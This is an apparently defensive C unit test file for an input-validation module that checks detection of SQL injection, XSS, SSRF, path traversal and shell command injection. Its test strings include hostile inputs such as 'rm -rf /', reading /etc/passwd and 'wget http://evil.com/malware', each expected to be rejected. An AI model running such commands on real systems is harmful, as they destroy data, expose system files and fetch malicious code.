/**
 * @file test_input_validator.c
 * @brief 输入验证器模块单元测试
 * 
 * 测试输入验证器的各项功能，包括：
 * - SQL注入检测
 * - XSS攻击检测
 * - 路径遍历检测
 * - 命令注入检测
 * - 缓冲区溢出保护
 * 
 * @copyright Copyright (c) 2026 SPHARX. All Rights Reserved.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include "../utils/test_framework.h"
#include "../../utils/security/input_validator.h"

/**
 * @test 测试字符串长度验证
 */
static void test_validate_string_length(void** state) {
    agentos_validation_result_t result;
    
    // 测试有效长度
    agentos_validate_string_length("valid", 1, 10, &result);
    AGENTOS_TEST_ASSERT_SUCCESS(result.is_valid);
    
    // 测试长度过短
    agentos_validate_string_length("a", 5, 10, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    AGENTOS_TEST_ASSERT_INT_EQUAL(AGENTOS_EINVAL, result.error_code);
    
    // 测试长度过长
    agentos_validate_string_length("this is a very long string", 1, 10, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    AGENTOS_TEST_ASSERT_INT_EQUAL(AGENTOS_EINVAL, result.error_code);
    
    // 测试NULL输入
    agentos_validate_string_length(NULL, 1, 10, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    AGENTOS_TEST_ASSERT_INT_EQUAL(AGENTOS_EINVAL, result.error_code);
}

/**
 * @test 测试标识符验证
 */
static void test_validate_identifier(void** state) {
    agentos_validation_result_t result;
    
    // 测试有效标识符
    agentos_validate_identifier("valid_identifier_123", 30, &result);
    AGENTOS_TEST_ASSERT_SUCCESS(result.is_valid);
    
    // 测试包含特殊字符
    agentos_validate_identifier("invalid@identifier", 30, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    AGENTOS_TEST_ASSERT_INT_EQUAL(AGENTOS_ESANITIZE, result.error_code);
    
    // 测试超长标识符
    agentos_validate_identifier("this_is_a_very_long_identifier_name_that_exceeds_limit", 30, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    AGENTOS_TEST_ASSERT_INT_EQUAL(AGENTOS_EINVAL, result.error_code);
}

/**
 * @test 测试SQL注入检测
 */
static void test_validate_sql_query(void** state) {
    agentos_validation_result_t result;
    
    // 测试正常SQL
    agentos_validate_sql_query("SELECT * FROM users WHERE id = 1", &result);
    AGENTOS_TEST_ASSERT_SUCCESS(result.is_valid);
    
    // 测试SQL注入 - UNION攻击
    agentos_validate_sql_query("SELECT * FROM users UNION SELECT * FROM passwords", &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试SQL注入 - OR 1=1
    agentos_validate_sql_query("SELECT * FROM users WHERE id = 1 OR 1=1", &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试SQL注入 - 注释攻击
    agentos_validate_sql_query("SELECT * FROM users WHERE id = 1; --", &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试危险操作 - DROP
    agentos_validate_sql_query("DROP TABLE users", &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试危险操作 - TRUNCATE
    agentos_validate_sql_query("TRUNCATE TABLE users", &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
}

/**
 * @test 测试SQL标识符净化
 */
static void test_sanitize_sql_identifier(void** state) {
    char* sanitized = NULL;
    agentos_error_t err;
    
    // 测试有效标识符
    err = agentos_sanitize_sql_identifier("valid_table", &sanitized);
    AGENTOS_TEST_ASSERT_SUCCESS(err);
    AGENTOS_TEST_ASSERT_PTR_NOT_NULL(sanitized);
    AGENTOS_TEST_ASSERT_STRING_EQUAL("valid_table", sanitized);
    if (sanitized) free(sanitized);
    sanitized = NULL;
    
    // 测试包含特殊字符的标识符
    err = agentos_sanitize_sql_identifier("table; DROP TABLE users--", &sanitized);
    AGENTOS_TEST_ASSERT_SUCCESS(err);
    AGENTOS_TEST_ASSERT_PTR_NOT_NULL(sanitized);
    // 特殊字符应该被转义或移除
    AGENTOS_TEST_ASSERT_FALSE(strstr(sanitized, ";") != NULL);
    if (sanitized) free(sanitized);
}

/**
 * @test 测试Shell命令验证
 */
static void test_validate_shell_command(void** state) {
    agentos_validation_result_t result;
    const char* allowed_commands[] = {"ls", "cat", "echo", NULL};
    
    // 测试允许的命令
    agentos_validate_shell_command("ls -la", allowed_commands, &result);
    AGENTOS_TEST_ASSERT_SUCCESS(result.is_valid);
    
    // 测试命令注入 - 分号
    agentos_validate_shell_command("ls; rm -rf /", allowed_commands, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试命令注入 - 管道
    agentos_validate_shell_command("ls | cat /etc/passwd", allowed_commands, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试危险命令
    agentos_validate_shell_command("rm -rf /", allowed_commands, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试未授权的命令
    agentos_validate_shell_command("wget http://evil.com/malware", allowed_commands, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
}

/**
 * @test 测试Shell参数净化
 */
static void test_sanitize_shell_param(void** state) {
    char* sanitized = NULL;
    agentos_error_t err;
    
    // 测试安全参数
    err = agentos_sanitize_shell_param("safe_filename.txt", &sanitized);
    AGENTOS_TEST_ASSERT_SUCCESS(err);
    AGENTOS_TEST_ASSERT_PTR_NOT_NULL(sanitized);
    if (sanitized) free(sanitized);
    sanitized = NULL;
    
    // 测试危险参数 - 命令注入
    err = agentos_sanitize_shell_param("filename; rm -rf /", &sanitized);
    AGENTOS_TEST_ASSERT_SUCCESS(err);
    AGENTOS_TEST_ASSERT_PTR_NOT_NULL(sanitized);
    // 特殊字符应该被转义
    if (sanitized) free(sanitized);
}

/**
 * @test 测试文件路径验证
 */
static void test_validate_file_path(void** state) {
    agentos_validation_result_t result;
    
    // 测试有效路径
    agentos_validate_file_path("/home/user/file.txt", NULL, &result);
    AGENTOS_TEST_ASSERT_SUCCESS(result.is_valid);
    
    // 测试路径遍历 - ../
    agentos_validate_file_path("../../../etc/passwd", NULL, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试路径遍历 - ..\
    agentos_validate_file_path("..\\..\\..\\windows\\system32", NULL, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试空字节注入
    agentos_validate_file_path("/home/user/file.txt\0.jpg", NULL, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试符号链接攻击（如果支持）
    agentos_validate_file_path("/tmp/../../etc/passwd", NULL, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
}

/**
 * @test 测试URL验证
 */
static void test_validate_url(void** state) {
    agentos_validation_result_t result;
    const char* allowed_schemes[] = {"http", "https", NULL};
    
    // 测试有效URL
    agentos_validate_url("https://www.example.com/path?query=value", allowed_schemes, &result);
    AGENTOS_TEST_ASSERT_SUCCESS(result.is_valid);
    
    // 测试危险协议 - javascript
    agentos_validate_url("javascript:alert('XSS')", allowed_schemes, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试危险协议 - data
    agentos_validate_url("data:text/html,<script>alert('XSS')</script>", allowed_schemes, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试SSRF - localhost
    agentos_validate_url("http://localhost:8080/admin", allowed_schemes, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试SSRF - 内网IP
    agentos_validate_url("http://192.168.1.1/admin", allowed_schemes, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试SSRF - 10.x.x.x
    agentos_validate_url("http://10.0.0.1/internal", allowed_schemes, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
}

/**
 * @test 测试URL解析
 */
static void test_parse_url(void** state) {
    char *scheme = NULL, *host = NULL, *path = NULL;
    uint16_t port = 0;
    agentos_error_t err;
    
    err = agentos_parse_url("https://www.example.com:8080/path/to/resource", 
                           &scheme, &host, &port, &path);
    AGENTOS_TEST_ASSERT_SUCCESS(err);
    AGENTOS_TEST_ASSERT_PTR_NOT_NULL(scheme);
    AGENTOS_TEST_ASSERT_PTR_NOT_NULL(host);
    AGENTOS_TEST_ASSERT_PTR_NOT_NULL(path);
    AGENTOS_TEST_ASSERT_STRING_EQUAL("https", scheme);
    AGENTOS_TEST_ASSERT_STRING_EQUAL("www.example.com", host);
    AGENTOS_TEST_ASSERT_INT_EQUAL(8080, port);
    
    if (scheme) free(scheme);
    if (host) free(host);
    if (path) free(path);
}

/**
 * @test 测试整数范围验证
 */
static void test_validate_int_range(void** state) {
    agentos_validation_result_t result;
    
    // 测试有效范围
    agentos_validate_int_range(50, 0, 100, &result);
    AGENTOS_TEST_ASSERT_SUCCESS(result.is_valid);
    
    // 测试超出范围（太小）
    agentos_validate_int_range(-10, 0, 100, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
    
    // 测试超出范围（太大）
    agentos_validate_int_range(200, 0, 100, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
}

/**
 * @test 测试浮点数范围验证
 */
static void test_validate_float_range(void** state) {
    agentos_validation_result_t result;
    
    // 测试有效范围
    agentos_validate_float_range(3.14, 0.0, 10.0, &result);
    AGENTOS_TEST_ASSERT_SUCCESS(result.is_valid);
    
    // 测试超出范围
    agentos_validate_float_range(-5.5, 0.0, 10.0, &result);
    AGENTOS_TEST_ASSERT_FALSE(result.is_valid);
}

/**
 * @test 测试安全内存复制
 */
static void test_safe_memcpy(void** state) {
    char dest[20];
    const char* src = "Hello, World!";
    agentos_error_t err;
    
    // 测试正常复制
    err = agentos_safe_memcpy(dest, sizeof(dest), src, strlen(src) + 1);
    AGENTOS_TEST_ASSERT_SUCCESS(err);
    AGENTOS_TEST_ASSERT_STRING_EQUAL(src, dest);
    
    // 测试缓冲区溢出保护
    err = agentos_safe_memcpy(dest, 5, src, strlen(src) + 1);
    AGENTOS_TEST_ASSERT_FALSE(err == AGENTOS_OK);
}

/**
 * @test 测试安全字符串复制
 */
static void test_safe_strcpy(void** state) {
    char dest[10];
    agentos_error_t err;
    
    // 测试正常复制
    err = agentos_safe_strcpy(dest, sizeof(dest), "short");
    AGENTOS_TEST_ASSERT_SUCCESS(err);
    AGENTOS_TEST_ASSERT_STRING_EQUAL("short", dest);
    
    // 测试截断
    err = agentos_safe_strcpy(dest, sizeof(dest), "this is a very long string");
    AGENTOS_TEST_ASSERT_FALSE(err == AGENTOS_OK);
}

/**
 * @test 测试安全字符串拼接
 */
static void test_safe_strcat(void** state) {
    char dest[20] = "Hello";
    agentos_error_t err;
    
    // 测试正常拼接
    err = agentos_safe_strcat(dest, sizeof(dest), ", World!");
    AGENTOS_TEST_ASSERT_SUCCESS(err);
    AGENTOS_TEST_ASSERT_STRING_EQUAL("Hello, World!", dest);
    
    // 测试缓冲区溢出保护
    err = agentos_safe_strcat(dest, sizeof(dest), " This is a very long string that will overflow");
    AGENTOS_TEST_ASSERT_FALSE(err == AGENTOS_OK);
}

/**
 * @test 测试便捷宏
 */
static void test_validation_macros(void** state) {
    agentos_validation_result_t result;
    agentos_error_t err = AGENTOS_OK;
    
    // 测试AGENTOS_VALIDATE_OR_RETURN
    agentos_validate_string_length("valid", 1, 10, &result);
    // 不应该返回
    AGENTOS_TEST_ASSERT_TRUE(result.is_valid);
    
    // 测试AGENTOS_SAFE_STRCPY
    char dest[20];
    err = AGENTOS_SAFE_STRCPY(dest, "test");
    AGENTOS_TEST_ASSERT_SUCCESS(err);
    AGENTOS_TEST_ASSERT_STRING_EQUAL("test", dest);
}

/**
 * @brief 运行所有测试
 */
int main(void) {
    const struct CMUnitTest tests[] = {
        cmocka_unit_test(test_validate_string_length),
        cmocka_unit_test(test_validate_identifier),
        cmocka_unit_test(test_validate_sql_query),
        cmocka_unit_test(test_sanitize_sql_identifier),
        cmocka_unit_test(test_validate_shell_command),
        cmocka_unit_test(test_sanitize_shell_param),
        cmocka_unit_test(test_validate_file_path),
        cmocka_unit_test(test_validate_url),
        cmocka_unit_test(test_parse_url),
        cmocka_unit_test(test_validate_int_range),
        cmocka_unit_test(test_validate_float_range),
        cmocka_unit_test(test_safe_memcpy),
        cmocka_unit_test(test_safe_strcpy),
        cmocka_unit_test(test_safe_strcat),
        cmocka_unit_test(test_validation_macros),
    };
    
    return cmocka_run_group_tests(tests, NULL, NULL);
}
